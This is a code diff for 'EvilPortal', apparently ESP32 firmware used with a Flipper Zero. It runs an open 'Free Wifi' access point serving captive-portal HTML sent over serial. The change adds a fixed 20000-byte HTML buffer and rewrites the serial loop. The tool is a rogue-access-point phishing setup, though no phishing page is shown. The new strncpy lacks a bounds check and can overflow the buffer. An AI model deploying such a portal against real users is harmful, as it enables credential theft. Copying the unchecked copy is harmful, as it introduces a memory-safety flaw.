@@ -3,13 +3,17 @@
 #include <AsyncTCP.h>
 #include <WiFiManager.h>
 
+#define MAX_HTML_SIZE 20000
+#define SD_CS 10
+
 WiFiManager wifiManager;
 
 class EvilPortal {
 private:
   const char *ssid;
   const char *password;
-  const char* HTML = "";
+  bool has_html = false;
+  char HTML[MAX_HTML_SIZE] = "";
 
 public:
   EvilPortal(const char *SSID = "Free Wifi") {
@@ -18,11 +22,8 @@ public:
 
   void begin() {
 
-    while (String(HTML).length() == 0)
-    {
-      Serial.println("Waiting For HTML");
-      delay(2000);
-    }
+    Serial.println("Waiting For HTML Within Begin");
+    loop();
 
     if (!wifiManager.startConfigPortal(ssid, NULL, HTML)) {
       Serial.println("failed to connect and hit timeout");
@@ -34,16 +35,23 @@ public:
   }
 
   void loop() {
-    if (Serial.available() && String(HTML).length() == 0) {
-      String input = Serial.readStringUntil('\n');
-
-      Serial.println(input.c_str());
-
-      if (input.startsWith("sethtml=")) {
-        input = input.substring(8);
-        HTML = input.c_str();
-        Serial.println("Got HTML");
+    Serial.println("Waiting for HTML Within Loop");
+    while (!has_html) {
+      if (Serial.available() > 0) {
+        Serial.println("About to Read String");
+        String flipperMessage = Serial.readString();
+        Serial.println("Got Message");
+        const char *serialMessage = flipperMessage.c_str();
+        Serial.println("String Compare");
+        if (strncmp(serialMessage, "sethtml=", strlen("sethtml=")) == 0) {
+          Serial.println("String Compare Complete");
+          serialMessage += strlen("sethtml=");
+          strncpy(HTML, serialMessage, strlen(serialMessage) - 1);
+          has_html = true;
+          Serial.println("html set");
+        }
       }
     }
+    Serial.println("all set");
   }
 };
